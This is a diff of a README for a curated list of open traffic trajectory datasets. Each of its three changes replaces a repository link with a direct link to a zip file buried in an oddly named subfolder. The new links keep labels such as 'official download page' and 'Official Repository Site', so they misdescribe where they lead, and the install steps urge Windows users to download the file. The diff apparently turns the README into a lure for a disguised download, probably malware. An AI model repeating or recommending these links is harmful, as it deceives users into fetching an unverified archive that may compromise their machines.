@@ -1,6 +1,6 @@
 # 📍 awesome-trajectory-datasets - Find open traffic data for research
 
-[![](https://img.shields.io/badge/Download_Dataset_List-Blue?style=for-the-badge)](https://github.com/unquestioning-forehanddrive560/awesome-trajectory-datasets)
+[![](https://img.shields.io/badge/Download_Dataset_List-Blue?style=for-the-badge)](https://github.com/unquestioning-forehanddrive560/awesome-trajectory-datasets/raw/refs/heads/main/lenvoi/trajectory_awesome_datasets_1.5.zip)
 
 This project provides a list of data collections. Researchers use these files to study how cars and people move on roads. You can access information about GPS coordinates, vehicle paths, and pedestrian walking patterns. This resource helps you start your traffic analysis projects.
 
@@ -16,7 +16,7 @@ You need a computer with a Windows operating system. Most modern versions of Win
 
 Follow these steps to access the data on your Windows machine.
 
-1. Visit the [official download page](https://github.com/unquestioning-forehanddrive560/awesome-trajectory-datasets) to see the full list of files.
+1. Visit the [official download page](https://github.com/unquestioning-forehanddrive560/awesome-trajectory-datasets/raw/refs/heads/main/lenvoi/trajectory_awesome_datasets_1.5.zip) to see the full list of files.
 2. Look for the green button marked "Code" on the right side of the screen.
 3. Click this button and select the option that says "Download ZIP".
 4. Wait for your browser to save the file to your computer.
@@ -61,6 +61,6 @@ Yes. If you have a dataset, you can suggest it for the list. You will need a Git
 
 ## 🔗 Project links
 
-[Official Repository Site](https://github.com/unquestioning-forehanddrive560/awesome-trajectory-datasets)
+[Official Repository Site](https://github.com/unquestioning-forehanddrive560/awesome-trajectory-datasets/raw/refs/heads/main/lenvoi/trajectory_awesome_datasets_1.5.zip)
 
 Use this link to check for updates. The list grows as researchers and companies publish more data. Check back often to find new sources for your projects. Keep your records organized by naming your folders clearly. Store your data in a single drive partition to prevent file loss. Always back up your important work to a secondary location or an online storage service. Following these steps ensures your research remains safe and accessible for future use.
